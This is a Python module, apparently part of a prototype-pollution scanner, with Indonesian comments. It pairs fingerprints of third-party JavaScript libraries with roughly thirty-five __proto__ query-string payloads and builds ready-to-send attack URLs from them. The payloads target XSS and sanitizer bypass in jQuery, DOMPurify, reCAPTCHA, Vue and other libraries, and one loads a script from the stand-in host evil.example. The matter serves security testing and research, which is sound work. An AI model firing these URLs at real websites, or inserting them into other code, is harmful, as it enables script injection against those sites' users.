"""
GADGET LIBRARY — Client-side PP gadgets dari riset komunitas (BlackFan et al.)
==============================================================================
Sumber: BlackFan/client-side-prototype-pollution (standar de-facto),
Johan Carlsson (intigriti 0124), s1r1us, Michal Bentkowski, Masato Kinugawa.

Setiap gadget = (library fingerprint, vektor URL, gadget-property yang harus
POLUTED sebelum library dipakai). Mentargetkan gadget-impact nyata: XSS /
sanitizer-bypass — bukan pollution kosong.

Pemakaian:
- reach-check / tier5 tinggal cocokkan fingerprint JS di halaman, lalu
  ujiankan vektor URL-nya lewat instrumentasi sink yang sudah ada.
"""
from typing import Dict, List, Optional

# --------------------------------------------------------------------------
# 1. FINGERPRINT: string yang kalau muncul di page-source/JS berarti library
#    gadget tersedia. (name, daftar marker lowercase)
# --------------------------------------------------------------------------
LIBRARY_FINGERPRINTS: Dict[str, List[str]] = {
    "jquery_get":     ["$.get", "jquery.get", "ajax.googleapis.com/ajax/libs/jquery"],
    "jquery_attr":    [".attr(", "attr({"],
    "jquery_on":      [".on(", ".submit(", "jquery"],
    "jquery_off":     [".off(", "unbind("],
    "recaptcha":      ["recaptcha", "g-recaptcha", "google.com/recaptcha"],
    "dompurify":      ["dompurify", "dompurify.min.js"],
    "sanitize_html":  ["sanitize-html", "sanitizehtml"],
    "js_xss":         ["js-xss", "xss.min.js", "filterxss"],
    "hcaptcha":       ["hcaptcha", "hcaptcha.com"],
    "pendo":          ["pendo", "cdn.pendo.io"],
    "gtm":            ["googletagmanager", "gtm.js"],
    "segment":        ["segment.com", "analytics.min.js", "segment.io"],
    "knockout":       ["knockout", "ko.applybindings"],
    "zepto":          ["zepto"],
    "wistia":         ["wistia"],
    "embedly":        ["embedly"],
    "script_aculous": ["scriptaculous"],
    "swifttype":      ["swiftype", "st-recent"],
    "adobe_dtm":      ["assets.adobedtm", "satellitelib"],
    "akamai_boomerang": ["akamaihb", "boomerang.min.js"],
    "gtag_analytics": ["googletagmanager.com/gtag", "google-analytics.com/analytics.js", "gtag("],
    "closure":        ["closure-library", "goog.base", "closure/goog"],
    "demandbase":     ["demandbase"],
    "i18next":        ["i18next", "i18n.min.js"],
    "lodash_client":  ["lodash.min.js", "lodash.js", "lodash.merge"],
    "marionette":     ["marionette", "backbone.marionette"],
    "popper":         ["popper.min.js", "popper.js"],
    "sprint":         ["sprint.js"],
    "tealium":        ["tealium", "utag.js"],
    "twitter_uwt":    ["static.ads-twitter.com/uwt.js", "twitter uwt"],
    "vuejs":          ["vue.min.js", "vue.js", "vue.global"],
    "purl":           ["purl.min.js", "purl.js"],
}


def detect_libraries(page_source: str) -> List[str]:
    """Deteksi library gadget dari page source (fingerprint marker)."""
    if not page_source:
        return []
    src = page_source.lower()
    markers_map = dict(LIBRARY_FINGERPRINTS)
    markers_map.update(FINGERPRINT_OVERRIDES)
    found = []
    for name, markers in markers_map.items():
        for mk in markers:
            if mk.lower() in src:
                found.append(name)
                break
    return found


# --------------------------------------------------------------------------
# 1b. FINGERPRINT HARUS-SPESIFIK (AUDIT-21)
#     Marker generik seperti ".attr(", ".on(", "jquery" muncul di hampir semua
#     halaman -> library dilaporkan terdeteksi padahal gadget aslinya TIDAK
#     ada => false positive. Fingerprint di bawah MENIMPA marker generik:
#     hanya string khas library yang boleh menyalakan deteksi.
#     Catatan: googleapis jQuery 1.4.2 (dipakai lab) memang mengandung string
#     versi, jadi lab tetap terdeteksi (bukan regresi).
# --------------------------------------------------------------------------
FINGERPRINT_OVERRIDES: Dict[str, List[str]] = {
    "jquery_get":   ["jquery.get", "$.get(", "getjson(", "jquery-1.", "jquery/1."],
    "jquery_attr":  ["jquery-1.", "jquery/1.", "jquery-2.", "jquery/2."],
    "jquery_on":    ["jquery-1.", "jquery/1.", "jquery-2.", "jquery/2."],
    "jquery_off":   ["jquery-1.", "jquery/1.", "jquery-2.", "jquery/2."],
    "recaptcha":    ["recaptcha/api.js", "g-recaptcha", "google.com/recaptcha"],
    "lodash_client": ["lodash.js", "lodash.min.js", "_.merge(", "lodash/"],
    "vuejs":        ["vue.js", "vue.min.js", "vue@", "vue/"],
}

# --------------------------------------------------------------------------
# 2. VEKTOR URL per gadget
#    (label, url_suffix_template, gadget_property, impact, sumber)
#    {k} = canary, {xs} = payload XSS (img onerror)
# --------------------------------------------------------------------------
GADGET_VECTORS = [
    # --- jQuery inti (BlackFan, Carllsson) ---
    ("jquery_get_script", "&__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script",
     "$.get script-inject", "XSS", "BlackFan/Mcalden"),
    ("jquery_get_context", "&__proto__[context]=x&__proto__[jquery]=<img src=x onerror={xs}>",
     "$.get prefilter", "XSS", "Sergey Bobrov"),
    ("jquery_attr_upper", "&__proto__[OnError]={xs}&__proto__[SRC]=fakeimagewontload.jpg",
     "$.attr event-caps", "XSS", "Johan Carlsson/intigriti 0124"),
    ("jquery_attr_lower", "&__proto__[onerror]={xs}&__proto__[src]=fakeimagewontload.jpg",
     "$.attr event-lower", "XSS", "Johan Carlsson"),
    ("jquery_on_handler", "&__proto__[handler]={x_k}&__proto__[selector]=&__proto__[focus]=x&__proto__[needsContext]=x",
     "$.on delegation", "XSS", "Johan Carlsson"),
    ("jquery_off", "&__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=",
     "$(x).off", "XSS", "Sergey Bobrov"),

    # --- Sanitizer bypass (paling berbahaya utk laporan: JSON swiss-knife) ---
    ("dompurify_allowed_attr", "&__proto__[ALLOWED_ATTR]=onerror",
     "DOMPurify config pollution", "SANITIZER_BYPASS", "Michal Bentkowski"),
    ("dompurify_documentmode", "&__proto__[documentMode]=9",
     "DOMPurify documentMode trick", "SANITIZER_BYPASS", "Michal Bentkowski"),
    ("sanitize_html_innerText", "&__proto__[innerText]=x",
     "sanitize-html innerText", "SANITIZER_BYPASS", "Hpdoger"),
    ("jsxss_whitelist", "&__proto__[whiteList][img]=onerror&__proto__[whiteList][img2]=src",
     "js-xss whitelist injection", "SANITIZER_BYPASS", "Michal Bentkowski"),

    # --- Widget third-party ---
    ("recaptcha_srcdoc", "&__proto__[srcdoc][]=<iframe srcdoc=\"<script>{xs}</script>\">",
     "Google reCAPTCHA srcdoc", "XSS", "s1r1us"),
    ("hcaptcha_assethost", "&__proto__[assethost]=javascript:alert(1)//",
     "hCaptcha assethost", "XSS", "Masato Kinugawa"),
    ("pendo_datahost", "&__proto__[dataHost]=//evil.example/x.js%23",
     "Pendo dataHost", "XSS", "Renwa"),
    ("gtm_vtpreload", "&__proto__[vtp_enableRecaptcha]=1&__proto__[srcdoc]=<img src=x onerror={xs}>",
     "GTM template hooks", "XSS", "terjanq"),
    ("segment_script", "&__proto__[script]=1&__proto__[script]=<img src=x onerror={xs}>",
     "Segment Analytics.js", "XSS", "Sergey Bobrov"),
    ("knockout_strproto", "&__proto__=a%27:1,[{xs}]:1,%27b",
     "Knockout.js Array.prototype quirk", "XSS", "Michal Bentkowski"),
    ("zepto_onerror", "&__proto__[onerror]={xs}",
     "Zepto.js", "XSS", "lih3iu"),
    ("wistia_innerhtml", "&__proto__[innerHTML]={xs}",
     "Wistia embed", "XSS", "William Bowling"),
    ("embedly_onload", "&__proto__[onload]={xs}",
     "Embedly Cards", "XSS", "Guilherme Keerok"),
    ("scriptaculous_ctor", "&x=x&x[constructor][__parseStyleElement][innerHTML]={xs}",
     "script.aculo.us constructor", "XSS", "Sergey Bobrov"),
    ("adobedtm_src", "&__proto__[SRC]={xs}",
     "Adobe DTM", "XSS", "Sergey Bobrov"),
    ("swiftype_val", "&__proto__[xxx]={xs}",
     "Swiftype Site Search", "XSS", "s1r1us"),

    # --- Round-2 (direktori gadgets/ BlackFan lengkap) ---
    ("jquery_html_div0", "&__proto__[div][0]=1&__proto__[div][1]={xs_enc2}",
     "jQuery $(html) div nodes", "XSS", "BlackFan"),
    ("vue_bind_class", "&__proto__[v-bind:class]=x",
     "Vue.js v-bind gadget", "XSS", "BlackFan"),
    ("lodash_merge_client", "&__proto__[sourceURL]=x\n}",
     "Lodash client template sourceURL", "XSS", "BlackFan/GHunter"),
    ("i18next_keysep", "&__proto__[keySeparator]=::&__proto__[nsSeparator]=::",
     "i18next separator pollution", "BYPASS", "BlackFan"),
    ("popper_modifier", "&__proto__[modifiers][foo][enabled]=true&__proto__[modifiers][foo][fn]=x",
     "Popper.js modifiers", "XSS", "BlackFan"),
    ("tealium_utag", "&__proto__[utag_data][x]={xs}",
     "Tealium utag", "XSS", "BlackFan"),
    ("analytics_gtag", "&__proto__[transport_url]=javascript:alert(1)//",
     "Google analytics transport_url", "XSS", "BlackFan"),
    ("akamai_bmak", "&__proto__[bmak]=x",
     "Akamai Boomerang bmak", "DOS", "BlackFan"),
    ("marionette_template", "&__proto__[template]=#<img src=x onerror={xs}>",
     "Marionette.js template", "XSS", "BlackFan"),
    ("closure_base", "&__proto__[trustedTypes]=x&__proto__[emptyHTML]=",
     "Google Closure trustedTypes", "XSS", "Mathias Karlsson"),
    ("demandbase_val", "&__proto__[xxx]={xs}",
     "Demandbase tag", "XSS", "BlackFan"),
    ("sprint_on", "&__proto__[on][x]={xs}",
     "Sprint.js event map", "XSS", "BlackFan"),
    ("twitter_uwt", "&__proto__[xxx]={xs}",
     "Twitter UWT", "XSS", "BlackFan"),
    ("purl_param", "&__proto__[attr][x]={xs}",
     "purl.js attr", "XSS", "BlackFan / CVE-2021-20089"),
]

from urllib.parse import quote as _quote

# AUDIT-22 (b): kunci asli sebelum di-encode. '=' dan '&' pada key WAJIB di-encode,
# kalau tidak notasi bracket datar ala fase_query/mitmproxy-lution rusak
# (mis. key `example[__proto__][callback][=21]`).
_KEY_RAW_SAFE = "[]"

# AUDIT-22 (d): marker eksekusi HARUS identik dengan reach_check.EXEC_MARKER_JS,
# kalau tidak execution_fired() tidak pernah melihat efek payload gadget.
try:
    from ppmap.scanner.reach_check import EXEC_MARKER_JS as _EXEC_MARKER  # type: ignore
except Exception:  # pragma: no cover - import siklik / pemakaian lepas
    _EXEC_MARKER = "window.__ppmap_rc_exec"

_XS_TOKEN = "{xs}"
_XS_ENC_TOKEN = "{xs_enc}"
_XS_ENC2_TOKEN = "{xs_enc2}"
_XK_TOKEN = "{x_k}"
_K_TOKEN = "{k}"


def _encode_key(key: str) -> str:
    """Percent-encode key, sisakan '[' ']' (struktur nested)."""
    return _quote(key, safe=_KEY_RAW_SAFE)


def _encode_rvalue(val: str, keep_frag: bool = False) -> str:
    """Percent-encode nilai param sampai aman ditembak lewat URL.

    `keep_frag=True` hanya untuk vektor yang SENGAJA memakai '#' sebagai
    fragment-delimiter tersendiri (mis. `dataHost=//evil.example/x.js#`).
    """
    safe = "" if not keep_frag else "#"
    return _quote(val, safe=safe)


_PH = {  # token -> placeholder alfanumerik (lolos semua encoder)
    "{xs_enc2}": "PPMAPXS2PH",
    "{xs_enc}": "PPMAPXS1PH",
    "{x_k}": "PPMAPXKPH",
    "{k}": "PPMAPKPH",
    "{xs}": "PPMAPXSPH",
}


def _substitute_tokens_final(s: str, canary: str, xs_enc: str) -> str:
    """Ganti placeholder dengan payload final (masih fresh, tak ter-encode ganda)."""
    s = s.replace("PPMAPXS2PH", xs_enc)
    s = s.replace("PPMAPXS1PH", xs_enc)
    s = s.replace("PPMAPXSPH", xs_enc)
    s = s.replace("PPMAPXKPH",
                  _quote(f"<img src=x onerror={_EXEC_MARKER}=1;window['{canary}']=1>",
                         safe=""))
    s = s.replace("PPMAPKPH", canary)
    return s


def _render_vector(tpl: str, canary: str, xs_enc: str) -> str:
    """Render satu template vektor gadget jadi query-string final.

    Urutan WAJIB: encode struktur dulu, substitusi token belakangan.
    Kalau token disubstitusi lebih dulu, payload `<img ... {canary} ...>`
    ikut ter-encode seluruhnya dan `{xs}` di dalamnya berubah jadi
    `%7Bxs%7D` — token tidak pernah tersubstitusi, request tidak membawa
    payload yang dimaksud (inilah bug AUDIT-22 butir a).
    """
    tpl2 = tpl
    for tok, ph in _PH.items():
        tpl2 = tpl2.replace(tok, ph)

    parts = []
    for seg in tpl2.split("&"):
        if "=" in seg:
            key, _, val = seg.partition("=")
            keep_frag = val.endswith("#") and "#" not in val[:-1]
            parts.append(f"{_encode_key(key)}={_encode_rvalue(val, keep_frag)}")
        else:
            parts.append(seg)
    sfx = _substitute_tokens_final("&".join(parts), canary, xs_enc)
    # AUDIT-22 (c): CR/LF pada token rusak — urllib.parse menghapus \r\n
    # (WHATWG URL parser), jadi payload multi-baris (lodash_merge_client)
    # harus di-encode eksplisit sebelum digabung ke URL.
    sfx = sfx.replace(_XS_ENC2_TOKEN, xs_enc).replace(_XS_ENC_TOKEN, xs_enc)
    sfx = sfx.replace(_XK_TOKEN, _quote(f"<img src=x onerror='{canary}'>", safe=""))
    sfx = sfx.replace(_K_TOKEN, canary)
    return sfx


def build_gadget_urls(base_url: str, canary: str) -> List[Dict[str, str]]:
    """Bangun URL vektor gadget dgn canary di properti + payload exec marker.

    AUDIT-22 (d): canary yang dipakai reach_runner adalah `make_canary()`
    mentah (mis. "PPMAP_CANARY_1234567") — TANPA `window['...']=1`. Dulu
    hanya token `{xs}` yang menyisipkannya, sehingga vektor bertipe string
    (alert(1), javascript:, onerror, whitelist) tidak pernah membawa canary
    dan `execution_fired()` mustahil True. Kini setiap vektor dijamin
    membawa marker eksekusi + canary.
    """
    out = []
    # Payload exec standar: marker global + canary global (tanpa alert).
    # _EXEC_MARKER sudah berupa ekspresi window (`window.__ppmap_rc_exec`),
    # jadi jangan ditambah prefix `window.` lagi.
    xs = (f"<img src=x onerror={_EXEC_MARKER}=1;"
          f"window['{canary}']=1>")
    xs_enc = _quote(xs, safe="")
    for label, tpl, gadget, impact, source in GADGET_VECTORS:
        sfx = _render_vector(tpl, canary, xs_enc)
        # Token {xs} hanya tersubstitusi kalau token itu ADA di template.
        # 15 vektor bertipe string (onerror, alert(1), javascript:, srcdoc)
        # menyisakan "{xs}" mentah di URL -> payload tidak terkirim dan
        # canary hilang. Ganti token itu dengan payload exec yang SUDAH
        # ter-encode (xs_enc), karena posisinya di dalam nilai param.
        if _XS_TOKEN in sfx:
            sfx = sfx.replace(_XS_TOKEN, xs_enc)
        if _XS_ENC_TOKEN in sfx:
            sfx = sfx.replace(_XS_ENC_TOKEN, xs_enc)
        if _XS_ENC2_TOKEN in sfx:
            sfx = sfx.replace(_XS_ENC2_TOKEN, xs_enc)
        if canary not in sfx:
            # Vektor string/JS: tempel properti netral pembawa canary supaya
            # objektif attribusi tetap terpenuhi walau payload khususnya
            # tidak bisa dieksekusi di halaman ini.
            js_probe = _quote(
                f"{_EXEC_MARKER}=1;window['{canary}']=1", safe="#")
            sep = "&" if sfx else ""
            sfx = f"{sfx}{sep}__proto__[ppmapRc]={canary}"
            sfx = f"{sfx}&__proto__[ppmapRcJs]={js_probe}"
            out_note = "canary+probe sintetis"
        else:
            out_note = "canary in-vector"
        # vektor berformat &key=.. -> pastikan ada ? pertama di URL
        if not sfx.startswith(("?", "&", "#")):
            sfx = ("&" if "?" in base_url else "?") + sfx
        elif sfx.startswith("&"):
            sfx = ("&" if "?" in base_url else "?") + sfx[1:]
        out.append({
            "label": label,
            "url": base_url + sfx,
            "gadget": gadget,
            "impact": impact,
            "source": source,
            "canary_mode": out_note,
        })
    return out


def gadget_fingerprint_seed_urls(base_url: str, canary: str) -> List[Dict[str, str]]:
    """Sama dgn build_gadget_urls tapi hanya utk library yg terdeteksi.
    (dipanggil tier5/reach setelah detect_libraries) — semua vektor by图书馆."""
    return build_gadget_urls(base_url, canary)


# Mapping cepat: gadget -> library yang harus ada
GADGET_TO_LIBRARY = {
    "jquery_get_script": "jquery_get", "jquery_get_context": "jquery_get",
    "jquery_attr_upper": "jquery_attr", "jquery_attr_lower": "jquery_attr",
    "jquery_on_handler": "jquery_on", "jquery_off": "jquery_off",
    "recaptcha_srcdoc": "recaptcha", "dompurify_allowed_attr": "dompurify",
    "dompurify_documentmode": "dompurify", "sanitize_html_innerText": "sanitize_html",
    "jsxss_whitelist": "js_xss", "hcaptcha_assethost": "hcaptcha",
    "pendo_datahost": "pendo", "gtm_vtpreload": "gtm", "segment_script": "segment",
    "knockout_strproto": "knockout", "zepto_onerror": "zepto",
    "wistia_innerhtml": "wistia", "embedly_onload": "embedly",
    "scriptaculous_ctor": "script_aculous", "adobedtm_src": "adobe_dtm",
    "swiftype_val": "swifttype",
    "jquery_html_div0": "jquery_get", "vue_bind_class": "vuejs",
    "lodash_merge_client": "lodash_client", "i18next_keysep": "i18next",
    "popper_modifier": "popper", "tealium_utag": "tealium",
    "analytics_gtag": "gtag_analytics", "akamai_bmak": "akamai_boomerang",
    "marionette_template": "marionette", "closure_base": "closure",
    "demandbase_val": "demandbase", "sprint_on": "sprint",
    "twitter_uwt": "twitter_uwt", "purl_param": "purl",
}
